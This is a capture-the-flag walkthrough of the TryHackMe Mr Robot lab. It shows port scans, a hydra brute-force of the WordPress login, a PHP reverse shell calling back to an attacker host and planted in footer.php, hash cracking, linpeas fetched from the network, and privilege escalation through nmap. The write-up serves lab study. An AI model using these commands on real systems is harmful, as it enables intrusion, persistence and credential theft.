# Mr Robot CTF

**Room Link:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)





## Scanning

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (10) (6).png" alt=""><figcaption></figcaption></figure>

### HTTP port 80

This ran for the majority of the time I was working on the box, I found the wordpress and checked robots.txt manually and the scan didn't really find anything of interest.

**Kali**

```
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

#### Key 1

<figure><img src="../../.gitbook/assets/image (7) (3).png" alt=""><figcaption></figcaption></figure>

**Downloaded fsocity.dic**

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

If you refresh the page you'll go to a wordpress site.

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Test to see what users exist in wordpress, if the user doesn't exist it will give an error saying the user is invalid.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -L fsocity.dic -p test  $VICTIM http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10
.10.70.148%2Fwp-admin%2F&testcookie=1:Invalid username" -V -t 30    
```

<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>

Because there were so many entries in fsocity.dic I tried to reduce it as much as I could by removing duplicates and passwords that I thought would be unlikely.

**Kali**

```
cat fsocity.dic | sort | uniq > new-fsocity.dic
#Remove lines with less than 4 characters
sed -r '/^.{,4}$/d' new-fsocity.dic > new-new-fsocity.dic
#Remove lines with just numbers
awk '! /^[0-9]+$/' new-new-fsocity.dic > nonums.dic 
#Remove lines with more than 11 characters
sed '/^.\{11\}./d' nonums.dic > final.txt
```



**Kali**

```
hydra -L Elliot -P fsocity.dic  $VICTIM http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F
10.10.70.148%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
```

<figure><img src="../../.gitbook/assets/image (13) (8).png" alt=""><figcaption></figcaption></figure>

## Reverse Shell

### Reverse Shell Failed Attempt

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```

**Kali**

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```



<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

Connection is made but it isn't stable.

<figure><img src="../../.gitbook/assets/image (5) (11).png" alt=""><figcaption></figcaption></figure>



### Reverse Shell&#x20;

wpscan found out that twentyfifeen is installed.

**Kali**

```
wpscan --url http://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (11) (1) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -vlnp 443
```

Added the same shell to footer.php which should appear on every page visited. Then I just went back to http://$VICTIM/join and it worked.

<figure><img src="../../.gitbook/assets/image (2) (1) (7).png" alt=""><figcaption></figcaption></figure>



Get autocomplete

**Victim**

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



**Victim**

```
cd /home/robot
ls
cat password.raw-md5 
```

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt
hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### LinPeas

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

**Victim**

```
/usr/local/bin/nmap --interactive
nmap> !sh
```

<figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
